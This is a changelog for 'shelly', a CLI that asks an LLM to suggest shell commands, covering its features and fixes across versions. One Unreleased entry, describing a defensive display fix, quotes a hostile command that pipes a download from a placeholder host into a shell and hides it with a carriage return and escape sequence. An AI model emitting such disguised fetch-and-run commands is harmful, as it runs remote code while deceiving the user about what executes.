# Changelog

All notable changes to this project are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Fixed

- **Ctrl+C during an executed command stops the command, not shelly.**
  shelly used to exit at once and leave a command that handles Ctrl+C
  (`ping`, `python3`, `ssh`, `docker logs -f`) still running, sharing the
  terminal with your shell, and its exit code was lost. shelly now waits for
  the command to finish and exits with its code.
- **Ctrl+C at the suggestion menu records token usage.** Leaving the menu
  with Ctrl+C skipped the usage log, so `--info` undercounted lifetime
  totals. The tokens are now recorded first; shelly still exits as
  interrupted (130), so `shelly && next` doesn't run `next`.
- **`--info` shows the real Anthropic token budget.** It printed 500 for
  every model, while the newer models are sent 2048. It now prints the
  budget actually sent, plus a `temperature` row saying whether one is sent.
- **What you see is what runs.** A reply carrying a carriage return or an
  escape sequence could hide part of a command on screen, e.g.
  `curl evil.example | sh #\r<ESC>[2Kls -la` displayed as just `ls -la`.
  Control characters other than newline and tab are now shown escaped
  (`\r`, `\x1b`) in suggestions, explanations and error messages. Executing,
  editing and copying still use the exact text, as does captured output
  (`$(shelly ...)`), and a warning under the command says so: a raw `\r`
  pasted into a shell without bracketed paste (e.g. tcsh) acts as Enter.
  Outside the menu the warning goes to stderr.
- **Piped prompts are sent whole.** `printf 'find big files\nin my home
  dir\n' | shelly` sent only the first line; it now sends every line.
- **Markdown cleanup no longer mangles some commands.** A csh command such
  as `` `which a` b `which c` `` lost its outer backticks, and a fenced
  block followed by prose kept the closing fence and the prose in the
  command.
- **Flags inside a prompt no longer need quoting.** `shelly find files with
  grep -r` failed with `Option 'r' is unknown.` Everything after the first
  prompt word is now prompt text, shelly's own options included, so
  `shelly list files --help` asks the model. `--` still lets a prompt start
  with a dash.
- **Saving the config keeps a symlink.** `shelly --config` replaced a
  symlinked `config.json` (e.g. one kept in a dotfiles repo) with a regular
  file. It now writes through to the link's target.
- **The wizard asks for `azure.tokenScope`.** A bad scope was reported next
  to Configure, but the wizard had no way to fix it. It also no longer
  accepts an invalid tenant while the saved scope is invalid.
- **`csh` is described as csh.** The model was told it was writing for
  tcsh.
- **`" anthropic"` is a known provider.** Spaces around `provider` in
  `config.json` are ignored.
- **A failed [e]dit handoff is reported.** If the shell wrapper's file
  can't be written, shelly prints the error and the command instead of a
  stack trace.

## [1.8.1]

### Fixed

- **Piped input no longer crashes.** With stdin redirected (e.g.
  `echo "list files" | shelly` or `shelly "list files" < /dev/null`), shelly
  used to reach the suggestion menu, fail to read a key, and exit with an
  unhandled exception after the request had already been paid for, without
  recording its token usage. It now prints only the suggested command to
  stdout and exits 0. The same happens when stdout is captured, so
  `$(shelly "...")` returns the command instead of waiting on a menu nobody
  can see. If the request fails, the error goes to stderr and shelly exits
  1, so stdout only ever holds a command. A bare `x=$(shelly)` still asks
  what you want to do, on stderr; with stdin piped there is nobody to ask,
  so it doesn't.
- **Error messages are readable again.** The native binary showed framework
  errors as bare resource keys, e.g. a trailing comma in `config.json` was
  reported as `TrailingCommaNotAllowedBeforeObjectEnd`. The full messages
  cost about 8 KB.
- **A `null` in `config.json` no longer crashes.** A hand-edited value such
  as `"provider": null` loaded as null and failed later with a stack trace;
  it is now reported like any other parse error, and the defaults are used.
  An unreadable `config.json` is reported the same way.
- **[r]etry tells the model what it is retrying.** The rejected suggestion
  is now sent along with the requested change, so a refinement such as
  "same thing, but recursive" or "without sudo" has something to refer to.
  Repeated retries carry every earlier suggestion. Leaving the change empty
  asks for a different command instead of repeating the same request.
- **Newer Claude models work.** Models such as Claude Haiku 5.5 rejected
  every request with "`temperature` is deprecated for this model". shelly now
  sends a temperature only to the older models that accept one, and gives
  the newer ones, which think before answering, a 2048 token budget instead
  of 500 so the command isn't cut off.
- **A cut-off answer is no longer offered as a command.** When the model
  hit its token limit mid-answer, shelly showed whatever it had, ready to
  run: a command cut short can do something else entirely (`rm -rf
  /tmp/build` stopping at `rm -rf /tmp/bui`). It now reports that the answer
  was cut off and shows nothing; a cut-off explanation is reported the same
  way, and you're returned to the menu. Applies to every provider.
- **Shell detection on Windows no longer stops at an unreadable process.**
  An ancestor whose path can't be read (e.g. one running elevated) used to
  end the search, falling back to the environment; it is now skipped like
  any other process that isn't a shell.

### Changed

- **The default Anthropic model is now `claude-haiku-5-5`** (was
  `claude-haiku-4-5-20251001`). This only affects new installs: shelly writes
  the model into `config.json` on first run, so an existing config keeps its
  model until you change `anthropic.model`.
- Requires `JDMallen.Toolbox.AI` and `JDMallen.Toolbox.AI.Azure` 4.8.0.
- `shelly --config` with stdout redirected now stops with "interactive
  terminal required", as it already did with stdin redirected, instead of
  writing the wizard's screens into the redirect target.
- Internal cleanup, with no other change in behavior:
  - Console output goes through one interface: colored lines and stderr
    included, so `Program` no longer writes to `Console` directly.
  - Each known shell's startup file and set-variable syntax now live in the
    shell table alongside its name and prompt hint, instead of in a second
    list in the config wizard.
  - One shared `PATH` lookup replaces the separate ones for the Azure CLI
    and the clipboard tools.
  - All types are `internal`; `ShellDetector` has its own file.
  - `provider` and `azure.auth` are parsed once, into enums, instead of
    being compared as strings in each place that reads them.
  - Building the chat provider moved out of `Program` into its own
    `ProviderFactory`, which takes the environment and an error writer, so
    its tests no longer redirect `Console.Error`.
  - An invalid `azure.tenantId` or `azure.tokenScope` is identified with
    the toolbox's new `AzureCliTokenProviderOptions.FindInvalidProperty()`,
    instead of building a token provider, catching its exception, and
    building another without the tenant to tell the two apart.
  - Process lookups: `/proc` is parsed culture-independently and a malformed
    stat line is reported as unreadable instead of throwing; on Windows the
    path buffer is allocated once per run instead of per process, and the
    P/Invoke declarations are corrected (`CloseHandle` returns `bool`, and
    error codes that were never read are no longer captured).

## [1.8.0]

### Added

- **Keyless Azure OpenAI without the Azure CLI.** Set `azure.auth` to
  `"azureIdentity"` to sign in through a browser. The first request opens the
  sign-in page; the tokens then stay in an encrypted cache in the system
  keyring, and `auth-record.json` next to `config.json` remembers the account,
  so later runs are silent.
- `azure.credential` picks the sign-in: `interactiveBrowser` (default),
  `deviceCode`, `default` (`DefaultAzureCredential`), `azureCli` or `azd`.
- `shelly --config` offers the browser sign-in as a third authentication
  method, then asks for the credential and an optional tenant, noting that
  personal Microsoft accounts need one.
- `shelly --info` reports the credential, tenant, scope and whether a sign-in
  is saved. The main menu's "needs setup" list names `azure.credential` when
  it is unknown.

### Changed

- Requires `JDMallen.Toolbox.AI` 4.6.0 and adds `JDMallen.Toolbox.AI.Azure`
  4.6.0. The native binary grows from about 7.7 MB to 14 MB.
- `shelly --config` text prompts accept a value wrapped in quotes (e.g. a
  pasted `"<tenant id>"`); one matching pair of surrounding quotes is removed.

## [1.7.0]

### Added

- **Keyless Azure OpenAI (Microsoft Entra ID).** Set `azure.auth` to
  `"azureCli"` and shelly sends a Microsoft Entra ID token from the Azure CLI
  (`az login`) instead of `AZURE_OPENAI_API_KEY`, for resources that use
  role-based access instead of keys. Optional `azure.tenantId` and
  `azure.tokenScope` settings pick the tenant and scope. The token is fetched
  on the first request and reused until shortly before it expires.
  `"apiKey"` stays the default, so existing configs are unchanged.
- `shelly --config` asks for the Azure authentication method. For the Azure
  CLI it asks for an optional tenant (`-` clears it), skips the API key step,
  and instead reports whether `az` is on PATH and prints the `az login`
  command and the role the account needs.
- `shelly --info` reports the Azure authentication method, and for the Azure
  CLI the tenant, scope, az's location and the sign-in command.
- The main menu's "needs setup" list names `az` when the Azure CLI isn't on
  PATH, and `azure.auth`, `azure.tenantId` or `azure.tokenScope` when one is
  invalid.

### Changed

- Requires `JDMallen.Toolbox.AI` 4.5.0.

## [1.6.1]

### Changed

- Token usage tracking now comes from `JDMallen.Toolbox.AI` 4.4.0
  (`TokenUsageTally`, `TokenUsageLog`) instead of shelly's own copy, shared
  with committy. `usage.json` keeps the same location and layout, so existing
  totals carry over.

## [1.6.0]

### Added

- **Token usage.** After the suggestion menu, faded text shows the tokens the
  current run has used so far (suggestions, retries and explanations).
  Each run's total is added to `usage.json` in the local app data directory,
  and `shelly --info` reports the lifetime total and the average per run,
  split into input and output tokens. Providers that don't report usage are
  left out of both. Set `"showTokenUsage": false` in `config.json` to hide
  the faded count; the totals are still recorded.

### Changed

- Requires `JDMallen.Toolbox.AI` 4.3.0, using its `GetCompletionAsync`
  (completion plus usage and metadata) in place of the deprecated
  `CompleteAsync`.

## [1.5.0]

### Added

- **`shelly --config`**: an interactive setup wizard. Pick the provider
  (Anthropic, OpenAI-compatible or Azure OpenAI), then fill in its settings;
  each prompt shows the current value and Enter keeps it. Numbers and URLs
  are validated as you type them. The wizard asks before saving
  `config.json`, and writes it via a temporary file so an interrupted save
  can't truncate it. A config file that fails to parse is backed up as
  `config.json.bak_<UTC timestamp>` before it is replaced.
- **API key help in the wizard.** It reports whether the provider's key
  variable is set (never its value). On Windows it offers to save the key as
  a user environment variable, with `*` shown while typing, saved only when
  you save the config. On Linux and
  macOS it prints the exact line for the detected shell and the startup file
  it belongs in (`set -Ux` for fish, which needs no file), and edits nothing.
- **Main menu.** `shelly` with no arguments now shows the version and a
  numbered menu: Ask a question (default, Enter), Configure, Info, and
  0 (or Esc) to exit. In the wizard, 0 (or Esc) at the provider menu goes
  back to the main menu without changing anything.
  When the active provider isn't ready, Configure is followed by what it
  still needs, e.g. `(needs setup: ANTHROPIC_API_KEY_SHELLY)`.
- **`azure.endpoint`** and **`azure.deployment`** config settings, so only
  the API key stays in the environment.

### Changed

- `shelly` with no arguments shows the main menu instead of prompting
  straight away. Piped input skips the menu, so scripts behave as before.
- A missing Azure endpoint or deployment now names the config keys
  (`azure.endpoint`, `azure.deployment`) and suggests `shelly --config`.

### Deprecated

- **`AZURE_OPENAI_ENDPOINT_HOST`** and **`AZURE_OPENAI_DEPLOYMENT`**. They
  are still read when the matching config setting is empty, with a warning;
  the config file wins when both are set. `shelly --config` pre-fills their
  values, so saving once migrates them. `--info` marks values that came from
  them as deprecated.

## [1.4.1]

### Added

- **`--info`** prints the active configuration without calling the model:
  config file path, provider, endpoint, model or deployment, token budget,
  whether the provider's API key variable is set (never its value), and the
  detected shell.
- **`azure.maxTokens`** in the config file sets the Azure generation budget
  (default `500`, as before). Reasoning deployments spend their hidden
  thinking from it, so they may need more to return an answer.
- **`azure.reasoningModel`** (default `false`): for reasoning deployments,
  stops sending `temperature`, which they reject.

### Changed

- **JDMallen.Toolbox.AI 3.1.0 → 4.2.1.** Azure requests now send
  `max_completion_tokens` instead of `max_tokens`, and no longer send `top_p`
  or the penalty parameters (they were the service defaults). Fixes `400
  unsupported_parameter` from reasoning deployments such as `gpt-6-luna`.

### Fixed

- **Errors exit non-zero.** A failed model request, or an empty suggestion,
  now exits `1` instead of `0`.

## [1.4.0]

### Added

- **Shell-aware suggestions.** shelly now detects the shell it was launched
  from (bash, zsh, POSIX sh, KornShell, fish, tcsh, PowerShell 7, Windows
  PowerShell 5.1, `cmd.exe`, Nushell, Elvish) by walking its parent
  processes, and tells the model to write commands for that shell, with
  syntax hints for the ones a model tends to answer in bash (fish, POSIX sh,
  PowerShell, `cmd.exe`, csh, Nushell, Elvish). `[p]` explains the command
  in terms of that shell. Set `SHELLY_SHELL` to override detection.

### Changed

- **`[x]` runs the command in the detected shell** instead of `$SHELL` (or
  `cmd.exe` on Windows), so a command written for the shell you're in runs in
  that shell. PowerShell runs with `-NoProfile -Command`. A shell that can't
  be started now reports an error instead of crashing.

## [1.3.0]

### Added

- **Localized UI.** Every user-facing string moved into
  `Resources/Strings.resx`, with translations for 19 cultures: `zh-Hans`,
  `zh-Hant`, `es`, `pt-BR`, `de`, `ja`, `fr`, `ru`, `ko`, `id`, `it`, `pl`,
  `tr`, `uk`, `vi`, `nl`, `cs`, `sv` and `th`. The culture comes from the OS
  UI culture (`LC_ALL`/`LC_MESSAGES`/`LANG` on Unix); anything untranslated
  falls back to English. Menu keys are unchanged in every language.
- **Explanations in your language.** The model prompts stay in English, which
  models follow most reliably; under a translated culture the explain prompt
  adds "Write your explanation in {language}." The translations are compiled
  into the Native AOT binary, which grows by about 153 KB on linux-x64.

## [1.2.0]

### Added

- **`--` ends option parsing**, so a prompt may start with a dash, e.g.
  `shelly -- -la but sorted by size`. `-h` and `-?` are also accepted as
  aliases for `--help`.

### Changed

- **Release binaries are now Native AOT.** The linux-x64 binary drops from
  13,973,876 to 6,886,504 bytes (archive 6,995,595 to about 3.2 MB), `--version`
  from about 0.12 s to under 0.01 s, and peak memory from about 23.5 MB to about
  12.9 MB.
- **`--help` and `--version` now exit 0** (they used to exit 1). Unknown options
  still exit 1.
- **Release workflow builds per OS on native runners** (AOT cannot cross-compile
  between operating systems) and gains a `dry_run` dispatch input that builds
  and uploads per-RID artifacts without tagging or releasing.

### Removed

- The `CommandLineParser` dependency, replaced by a small built-in parser.

## [1.1.0]

Adds a third backend: any endpoint speaking the OpenAI `/v1/chat/completions`
API, which covers openai.com and — the motivating case — models you host
yourself via llama.cpp, llama-swap, Ollama, vLLM, or LM Studio. Nothing about
the existing Anthropic and Azure setups changes.

### Added

- **`openai` provider (alias `local`).** Set `provider` to `"openai"` and fill in
  the new `openai` block in the config file: `baseUrl` (the API root including
  the version segment, e.g. `http://10.10.0.20:8080/v1`), `model` (whatever your
  server reports at `/v1/models`), plus optional `timeoutSeconds` and
  `maxTokens`. Both `baseUrl` and `model` are deployment-specific, so neither has
  a default; leaving either blank fails with a message naming the missing key and
  the config file's path.
- **Optional API key.** `OPENAI_API_KEY_SHELLY` is sent as a bearer token when
  set and omitted entirely when not, because self-hosted runners generally do not
  authenticate.
- **Reasoning-model support.** Thinking blocks are stripped before the
  suggestion is shown, whether the server splits them into `reasoning_content` or
  inlines them as `<think>…</think>`. If generation is truncated mid-thought,
  shelly reports "No suggestion received from API" instead of offering raw
  reasoning as a command to execute.

### Changed

- **The HTTP timeout is now per-provider.** Anthropic and Azure keep the previous
  30 seconds; the `openai` provider defaults to `timeoutSeconds: 300`, because a
  self-hosted model may have to load its weights from disk before it produces a
  single token.
- **The token budget is now per-provider.** Anthropic and Azure keep the previous
  500; the `openai` provider defaults to `maxTokens: 2048`, since a reasoning
  model spends most of its output on a thinking block that never reaches the
  caller and a 500-token budget leaves no room for an answer.
- **`JDMallen.Toolbox.AI`** upgraded to **3.1.0**, which supplies the underlying
  `OpenAICompatibleChatClient`.

## [1.0.0]

The first stable release. It adds an `[e]dit` action with zsh shell integration,
replaces the bundled clipboard library with a runtime-detected system clipboard,
and—most significantly—swaps the two hand-rolled, SDK-backed chat providers for a
single thin provider built on the **`JDMallen.Toolbox.AI`** package. The major
version bump reflects that provider rearchitecture and the removal of the
`Anthropic`, `Azure.AI.OpenAI`, and `TextCopy` dependencies; the user-facing
configuration (the `shelly` config file, the `ANTHROPIC_API_KEY_SHELLY` /
`AZURE_OPENAI_*` environment variables, and the CLI itself) is unchanged.

### Added

- **`[e]dit` action with shell integration.** A new suggestion-menu action drops
  the suggested command onto your **next shell prompt**, unexecuted, so you can
  tweak it before running. Because a program can't type into its parent shell's
  input line, this ships as a small zsh wrapper (`shell/shelly.zsh`) that runs
  the real `shelly` and, on `e`, pushes the command onto the next prompt via
  zsh's `print -z`. The app and wrapper coordinate through an environment-variable
  handoff (`EditHandoff`): the option only appears when the wrapper is active, and
  the wrapper is bundled into the non-Windows release archives. bash/fish are not
  supported yet (neither can reliably prefill the next prompt the way `print -z`
  does).
- **Runtime-detected system clipboard.** The `[c]opy` action now shells out to a
  platform-appropriate clipboard tool, detecting availability at startup
  (`wl-clipboard`/`xclip`/`xsel` on Linux, with a graphical `WAYLAND_DISPLAY`/
  `DISPLAY` session). When no clipboard is reachable—e.g. a headless or SSH
  session—the `[c]opy` option is hidden and `shelly` says so; every other action
  still works.
- **Dynamic suggestion menu.** The menu now only offers actions that can actually
  work in the current environment: `[e]dit` appears only when the shell wrapper is
  active, and `[c]opy` only when a clipboard is available. The explain key moved
  from `e` to `p`, so the full menu reads
  `e[x]ecute  [e]dit  ex[p]lain  [c]opy  [r]etry  [q]uit`.
- **`global.json`** pinning the .NET SDK (`10.0.300`, `latestMinor` roll-forward)
  for reproducible builds, and a **`nuget.config`** pinning `nuget.org` as the
  sole package source.
- **Solution Items folder** in `JDMallen.Shelly.slnx` surfacing `.gitignore`,
  `LICENSE`, `README.md`, `scripts/publish.sh`, and `shell/shelly.zsh` in the IDE.
- Expanded **README** sections covering the `[e]dit` shell integration, the Linux
  clipboard requirements, and the dynamic menu behavior.

### Changed

- **Chat providers rearchitected onto `JDMallen.Toolbox.AI` (3.0.0).** The two
  hand-rolled providers (`AnthropicChatProvider`, `AzureChatProvider`), which each
  spoke their vendor's wire format directly, are replaced by a single
  `ChatProvider` that owns shelly's prompt construction, token budget, and
  answer post-processing and delegates the provider-specific HTTP/JSON to a
  Toolbox.AI `IChatCompletionClient` (`AnthropicChatClient` /
  Azure client). Provider selection, env-var configuration, and behavior are
  unchanged. All chat completions now share a single `HttpClient` (30s timeout)
  for the REPL session.
- **Publishing refactored to the shared engine.** `scripts/publish.sh` is now a
  thin wrapper that sets per-app variables (exe name, runtimes, the extra
  `shell/shelly.zsh` file for non-Windows archives) and sources a vendored,
  shared `scripts/publish-dotnet.sh` engine; its behavior and the default RID set
  (`linux-x64`, `linux-arm64`, `win-x64`, `win-arm64`, `osx-x64`, `osx-arm64`)
  are unchanged.
- **Release workflow rewritten to publish on merge.** `.github/workflows/release.yml`
  now triggers on pushes to `main` instead of on `v*` tags: it reads `<Version>`
  from `Directory.Build.props`, no-ops if that tag already exists, builds the
  archives with `scripts/publish.sh`, then creates the GitHub release and its tag
  (raw semver, no `v` prefix) in one atomic `gh` call ordered after a successful
  build, with `SHA256SUMS.txt` attached. Release notes are the matching
  `CHANGELOG.md` section (extracted with an `awk` script) rather than GitHub's
  auto-generated notes. Routine merges that don't bump `<Version>` never
  re-release.
- **Single version source of truth in `Directory.Build.props`.** `<Version>` is
  set there (so it applies to every project, app and tests) and read by both
  `scripts/publish.sh` and the release workflow; it is bumped to `1.0.0`.

### Removed

- **`Anthropic` (12.21.0) and `Azure.AI.OpenAI` (2.1.0) SDK dependencies**,
  replaced by the lightweight Toolbox.AI client. With them gone, the
  `JsonSerializerIsReflectionEnabledByDefault` trimming workaround they required
  is no longer needed and has been dropped.
- **`TextCopy` (6.2.1) dependency**, replaced by the runtime-detected system
  clipboard.

## [0.1.0]

Initial release. A tiny, self-contained CLI that turns plain-English descriptions
into shell commands using an LLM, modeled on the (discontinued) GitHub Copilot
`suggest` / `explain` CLI.

### Added

- **Natural-language-to-shell REPL.** Given a description, `shelly` asks an LLM
  for a command and presents an interactive suggestion menu:
  `e[x]ecute  [e]xplain  [c]opy  [r]etry  [q]uit`. Execute runs the command in the
  user's `$SHELL` (or `cmd.exe` on Windows); retry can take a refinement to nudge
  the model.
- **Provider-swappable backends.** Anthropic (Claude) and Azure OpenAI providers
  (`AnthropicChatProvider`, `AzureChatProvider` behind `IChatProvider`), selected
  by the config file and configured via environment variables
  (`ANTHROPIC_API_KEY_SHELLY`; `AZURE_OPENAI_API_KEY`, `AZURE_OPENAI_ENDPOINT_HOST`,
  `AZURE_OPENAI_DEPLOYMENT`).
- **Testable, abstracted core.** A `ReplLoop` built on `IConsoleIO`, `IClipboard`,
  and `IChatProvider` abstractions; a `CommandSanitizer` that strips code fences
  and backticks from model output; shell/OS-aware `ShellContext`; system/explain
  `Prompts`; and a source-generated JSON `ShellyConfig` loaded from the user
  config path. Clipboard support via `TextCopy`; argument parsing via
  `CommandLineParser`.
- **Self-contained distribution.** .NET 10, published as single-file,
  self-contained, trimmed binaries for six RIDs (`linux-x64`, `linux-arm64`,
  `win-x64`, `win-arm64`, `osx-x64`, `osx-arm64`) via `scripts/publish.sh`.
- **CI and release automation.** A GitHub Actions CI workflow plus a `v*`-tag /
  `workflow_dispatch`-triggered release workflow that builds the per-RID archives
  on a matrix, generates `SHA256SUMS.txt`, and creates a GitHub release with
  auto-generated notes.
- **Unit test suite** (`test/JDMallen.Shelly.Tests`, xunit v3) covering the
  command sanitizer and the REPL loop, with console, clipboard, and chat-provider
  fakes.
- A **README** documenting installation (release downloads and build-from-source),
  configuration, usage, and the suggestion-menu keys.
